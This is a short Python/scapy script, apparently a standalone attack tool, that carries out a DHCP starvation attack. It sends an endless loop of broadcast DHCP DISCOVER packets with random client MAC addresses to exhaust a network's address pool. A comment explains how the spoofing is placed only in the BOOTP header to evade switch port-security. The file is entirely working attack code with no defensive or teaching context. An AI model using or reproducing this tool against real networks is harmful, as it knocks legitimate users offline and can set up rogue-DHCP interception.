from scapy.all import *
import random 
import time




def mac_generator() :
    mac_array = []
    string = ""
    for i in range(1,7) :
        string = "" 
        random_hex = ""
        for d in range(2) :           
            random_hex = format(random.randint(0,15),"x")
            string += random_hex

        mac_array.append(string)
    return ":".join(mac_array)


fam,hw = get_if_raw_hwaddr(conf.iface)
print(hw)

def DHCP_DISCOVER():
    counter,timer = 0,0
    
    try :
        while True:
            try : 
                mac = mac_generator()
                #the first one will stop in case of port-security
                #Discover = Ether(dst="ff:ff:ff:ff:ff:ff",src=mac) / IP(src="0.0.0.0",dst="255.255.255.255",proto=17) / UDP(sport=68,dport=67) / BOOTP(chaddr=mac) /DHCP(options=[("message-type","discover"),"end"])
                #this one won't be stopped by the port-security because we are only spoofing the mac address in the bootp header
                
                Discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",dst="255.255.255.255",proto=17) / UDP(sport=68,dport=67) / BOOTP(chaddr=mac) /DHCP(options=[("message-type","discover"),"end"])
                srp(Discover,verbose=False,timeout=0)
                time.sleep(timer)
                if counter >= 255 :
                    timer = 0
                counter += 1
                print("\r[+] packer sent : ",counter,end="")
            except KeyboardInterrupt :
                print("\nMade By MOBO ... Quitting ")
                break
    except : 
        print("an error has happend ")


DHCP_DISCOVER()
